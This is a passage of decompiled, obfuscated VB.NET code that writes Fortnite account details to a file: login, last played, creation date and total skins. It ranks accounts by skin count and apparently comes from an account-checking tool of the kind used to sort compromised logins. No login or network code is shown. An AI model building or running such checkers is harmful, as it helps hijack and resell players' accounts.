                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit._ConstructorBuilder())) Then
                    streamWriter.WriteLine(isImplicit.MethodSpecUser())
                    Me.EndOf.WriteMessageEvent(Me.set_Select)
                    num = 1001
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ClearPool())) Then
                    streamWriter.WriteLine(isImplicit.remove_BackgroundImageLayoutChanged())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.HelpFilePath)) Then
                    streamWriter.WriteLine(isImplicit.add_ProcessExit())
                    Me.EndOf.PathTooLongException(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.FixedFrameBorderSize)) Then
                    streamWriter.WriteLine(isImplicit.GetFileColumnNumber())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DRAWITEMSTRUCT())) Then
                    streamWriter.WriteLine(isImplicit.ContentPanel)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetWordSpacing())) Then
                    streamWriter.WriteLine(isImplicit.GetMenuItemInfo())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IdentityReference)) Then
                    streamWriter.WriteLine(isImplicit.CodeArrayIndexerExpression())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MaximumProgress)) Then
                    streamWriter.WriteLine(isImplicit.EnumerableSorter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ACCESSERROR())) Then
                    streamWriter.WriteLine(isImplicit.GetCertHash())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_BaseInset())) Then
                    streamWriter.WriteLine(isImplicit.ITransportHeaders())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IIdentityPermissionFactory())) Then
                    streamWriter.WriteLine(isImplicit.XsdKatmaiTimeToDateTimeOffset())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SynchronizeCompletedEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.XmlAnyAttributeAttribute())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DataGridViewRowStateChangedEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.CustomSort())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MD5Cng())) Then
                    streamWriter.WriteLine(isImplicit.IMenuCommandService())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Button)) Then
                    streamWriter.WriteLine(isImplicit.IsFile())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TypeOrSimpleNameResolution())) Then
                    streamWriter.WriteLine(isImplicit.Values)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.XsdDateTimeKind())) Then
                    streamWriter.WriteLine(isImplicit.GetEnumerator())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetMethodSemanticsRid())) Then
                    streamWriter.WriteLine(isImplicit.AddSerializationProvider())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetHPal())) Then
                    streamWriter.WriteLine(isImplicit.MouseOverBackColor)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_PixelFormat())) Then
                    streamWriter.WriteLine(isImplicit.GetRuntimeFieldHandleFromMetadataToken())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetChildValueOwner())) Then
                    streamWriter.WriteLine(isImplicit.GetImpersonationUserName())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SizeType)) Then
                    streamWriter.WriteLine(isImplicit.set_CachedBounds())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Adler)) Then
                    streamWriter.WriteLine(isImplicit.NMSELCHANGE())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetUniqueID())) Then
                    streamWriter.WriteLine(isImplicit.RespectReadonly())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TranslateSigWithScope())) Then
                    streamWriter.WriteLine(isImplicit.GetNestedType())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Flags())) Then
                    streamWriter.WriteLine(isImplicit.SetIsMethodTypeParameter())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ResetDC())) Then
                    streamWriter.WriteLine(isImplicit.RangeHeaderValue())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetPosition())) Then
                    streamWriter.WriteLine(isImplicit.Emit())
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ResetAccessRule())) Then
                    streamWriter.WriteLine(isImplicit.ExtensionAttribute())
                    Me.EndOf.XPathNavigatorKeyComparer(Me.set_Select)
                    num = num + 1
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RevertDeny())) Then
                    streamWriter.WriteLine(isImplicit.set_IsApplicationTrustedToRun())
                    num = num + 1
                End If
                streamWriter.WriteLine(isImplicit.NclUtilities())
                streamWriter.WriteLine(isImplicit.FormClosedEventHandler())
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.WhenAll())) Then
                    streamWriter.WriteLine(isImplicit.VerifyString())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.isIndexer())) Then
                    streamWriter.WriteLine(isImplicit.SchemaLocation)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetKeyAlgorithmParametersString())) Then
                    streamWriter.WriteLine(isImplicit.d__534())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IConvertible())) Then
                    streamWriter.WriteLine(isImplicit.EndLoad())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SetSealed())) Then
                    streamWriter.WriteLine(isImplicit.IsWmf())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetHbitmap())) Then
                    streamWriter.WriteLine(isImplicit.ExternalThreading)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddPie())) Then
                    streamWriter.WriteLine(isImplicit.WebParseErrorCode())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_BboxRight())) Then
                    streamWriter.WriteLine(isImplicit.ServerIdentityObject)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ImmGetConversionStatus())) Then
                    streamWriter.WriteLine(isImplicit.SqlCompareOptions())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TOKEN_SOURCE())) Then
                    streamWriter.WriteLine(isImplicit.Owner)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.MonthNames)) Then
                    streamWriter.WriteLine(isImplicit.AsyncWorkItem())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Construct206PartialContent())) Then
                    streamWriter.WriteLine(isImplicit.OnComponentChanged())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ComMemberType())) Then
                    streamWriter.WriteLine(isImplicit.InstanceId)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Process32First())) Then
                    streamWriter.WriteLine(isImplicit.LoopTimer())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateLocalDataStore())) Then
                    streamWriter.WriteLine(isImplicit.set_AllowSimulations())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_VTableFixups())) Then
                    streamWriter.WriteLine(isImplicit.ValidateSlot())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TcpState())) Then
                    streamWriter.WriteLine(isImplicit.CMDWrapper())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ConnectionManagementSectionInternal())) Then
                    streamWriter.WriteLine(isImplicit.StreamWrapper())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetThemeInt())) Then
                    streamWriter.WriteLine(isImplicit.TreeRotation())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IComparer())) Then
                    streamWriter.WriteLine(isImplicit.IntRestoreDC())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CurrentDeploymentSourceUri)) Then
                    streamWriter.WriteLine(isImplicit.IOleServiceProvider())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CodeDelegateCreateExpression())) Then
                    streamWriter.WriteLine(isImplicit.IPrincipal())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetMethodSignature())) Then
                    streamWriter.WriteLine(isImplicit.set_Spring())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DrawMenuItemBackground())) Then
                    streamWriter.WriteLine(isImplicit.FDE_SHAREVIOLATION_RESPONSE())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Pos())) Then
                    streamWriter.WriteLine(isImplicit.NameClaimType)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IPictureDisp())) Then
                    streamWriter.WriteLine(isImplicit.set_SchemaSerializationMode())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.LambdaExpressionProxy())) Then
                    streamWriter.WriteLine(isImplicit.MonthDayPattern)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.VerticalScrollBarArrowHeight)) Then
                    streamWriter.WriteLine(isImplicit.BaseName)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetSymbolLoader())) Then
                    streamWriter.WriteLine(isImplicit.EvtGetChannelConfigProperty())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DateTimeOffsetMarshaler())) Then
                    streamWriter.WriteLine(isImplicit.ThreeState)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.remove_MaximumSizeChanged())) Then
                    streamWriter.WriteLine(isImplicit.DrawLabelBackground())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ThumbTop())) Then
                    streamWriter.WriteLine(isImplicit.set_PublicKeyOrToken())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.Salmon)) Then
                    streamWriter.WriteLine(isImplicit.IsSame())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CreateSetComparer())) Then
                    streamWriter.WriteLine(isImplicit.ColorChannelFlag())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_ToolTipTitle())) Then
                    streamWriter.WriteLine(isImplicit.SQL_COLUMN())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ToSqlDateTime())) Then
                    streamWriter.WriteLine(isImplicit.SetSwitch())
                    Me.EndOf.Join(Me.set_Select)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ActiveX())) Then
                    streamWriter.WriteLine(isImplicit.GetApplicationComponentManifest())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.add_CellMouseLeave())) Then
                    streamWriter.WriteLine(isImplicit.PropertyDefUser())
                    Me.EndOf.GetGUID(Me.set_Select)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ColumnClickEventHandler())) Then
                    streamWriter.WriteLine(isImplicit.ModalResult)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DeploymentData)) Then
                    streamWriter.WriteLine(isImplicit.set_Active())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.NextSample())) Then
                    streamWriter.WriteLine(isImplicit.CompatibleComparer())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CanReduce)) Then
                    streamWriter.WriteLine(isImplicit.Zone)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CleanupWorkList())) Then
                    streamWriter.WriteLine(isImplicit.DocumentText)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AddressPreferredLifetime)) Then
                    streamWriter.WriteLine(isImplicit.ColumnHeaderImageListIndexer())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GenericUriParserOptions)) Then
                    streamWriter.WriteLine(isImplicit.NetResources)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.GetCheckSumAlgorithmId())) Then
                    streamWriter.WriteLine(isImplicit.ReadBlock())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.UdtTypeName)) Then
                    streamWriter.WriteLine(isImplicit.d__101())
                End If
                streamWriter.WriteLine(isImplicit.NclUtilities())
                streamWriter.WriteLine(isImplicit.XmlAttributes())
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_DisconnectReuseSocket())) Then
                    streamWriter.WriteLine(isImplicit.ApplicationPolicy)
                    Me.EndOf.UserStringBuilder(Me.set_Select)
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.SecurityContextRunData())) Then
                    streamWriter.WriteLine(isImplicit.XmlSchemaWhiteSpaceFacet())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.AcceptAsync())) Then
                    streamWriter.WriteLine(isImplicit.GetIndexInOwnParameters())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.set_Panel2Collapsed())) Then
                    streamWriter.WriteLine(isImplicit.FinalResolved)
                End If
                streamWriter.WriteLine("-------------------<Account-INFO>-----------------------")
                streamWriter.WriteLine(String.Concat("- Login: ", Me.set_Select))
                streamWriter.WriteLine(String.Concat("- Last Played: ", value))
                streamWriter.WriteLine(String.Concat("- Account Created: ", str))
                streamWriter.WriteLine(String.Concat("- Total Skins: ", Conversions.ToString(num)))
                    If (num >= 1000) Then
                        streamWriter.WriteLine(isImplicit.PictureBox())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 150) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 140) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 130) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 120) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 110) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 100) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 90) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 80) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 70) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 60) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 50) Then
                        streamWriter.WriteLine(isImplicit.onstart())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 40) Then
                        streamWriter.WriteLine(isImplicit.WriteEntityRefAsync())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 30) Then
                        streamWriter.WriteLine(isImplicit.ProcessingMetaDataChanges)
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 20) Then
                        streamWriter.WriteLine(isImplicit.TransactionType())
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num > 10) Then
                        streamWriter.WriteLine(isImplicit.DependentAssemblies)
                        Me.EndOf.ScopeExpression(Me.set_Select)
                    ElseIf (num < 1) Then
                        streamWriter.WriteLine(isImplicit.ExactPropertyBinding())
                    Else
                        streamWriter.WriteLine(isImplicit.PlayRecordCallback())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.PingCompletedEventHandler())) Then
                    streamWriter.WriteLine(isImplicit.CollectionBase())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ReceivedPacketsDiscarded)) Then
                    streamWriter.WriteLine(isImplicit.AsnEncodedDataCollection())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.TraceSource())) Then
                    streamWriter.WriteLine(isImplicit.StreamWriterBufferedDataLost())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.IMAGE_RESOURCE_DIRECTORY())) Then
                    streamWriter.WriteLine(isImplicit.NameValueHeaderValue())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.RowMargin)) Then
                    streamWriter.WriteLine(isImplicit.StrongNameSignatureGenerationEx())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.CallingContext)) Then
                    streamWriter.WriteLine(isImplicit.d__9())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.ToolStripItemRenderEventArgs())) Then
                    streamWriter.WriteLine(isImplicit.SecurityDescriptorReferenceEntry())
                End If
                If (u003cParseEntityDeclAsyncu003ed_168.Contains(isImplicit.DeviceContextType)) Then
                    streamWriter.WriteLine(isImplicit.EventHandlerList())
                End If
                streamWriter.WriteLine("----------------------<FORTNITE>--------------------------")
                streamWriter.WriteLine("--------------------------------------------------------")
                streamWriter.WriteLine(Environment.NewLine)
            Return obj

        End Function
    End Class

    Public Enum WriteChar
        const_0
        const_1
    End Enum


End Class
